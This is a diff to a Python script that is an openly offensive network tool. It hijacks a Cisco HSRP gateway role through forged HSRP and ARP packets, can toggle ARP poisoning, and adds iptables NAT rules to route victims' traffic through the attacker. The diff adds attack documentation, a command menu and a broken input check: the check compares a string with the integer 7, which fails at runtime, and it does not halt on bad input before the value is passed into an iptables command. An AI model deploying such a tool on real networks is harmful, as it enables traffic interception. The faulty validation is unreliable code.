@@ -153,7 +153,9 @@ def check_v1_fields(packet):
     return True
 
 def send_hsrp(packet):
-    '''Send HSRP packets forever until execution of program ends'''
+    '''Mimics cisco HSRP behaviour and sends HSRP and ARP packets to take over existing HSRP router.
+    
+    After initial HSRP/ARP pattern, sends HSRP packets forever until execution of program ends'''
     global attackstarted
     attackstarted = True
     if attackportsecurity:
@@ -459,7 +461,14 @@ def delayed_failure_check():
 # 
 def user_input_handler():
     '''Performs action based on user input'''
+    print("\n[INFO] Commands available:\n\
+        debug: Show more information\n\
+        suppress: Suppress console output\n\
+        poison: toggle ARP poisoning\n\
+        silent: toggle silent mode\n\
+        translate <ip>: perform nat translations for ip address")
     while True:
+        usrinput: str
         usrinput = input().split()
         match usrinput[0]:
             case "stop":
@@ -470,6 +479,9 @@ def user_input_handler():
                 debug = debug != True
                 print(f"[INFO] Debug set to {debug}")    
             case "translate":
+                # quick and simple validation
+                if usrinput[1].strip() < 7:
+                    print("[INFO] Please check input")
                 command = f"iptables -t nat -A POSTROUTING -o eth0 -s {usrinput[1]} -j MASQUERADE"
                 subprocess.run(command.split())
                 print(f"[INFO] Now translating packets from source: {usrinput[1]}")
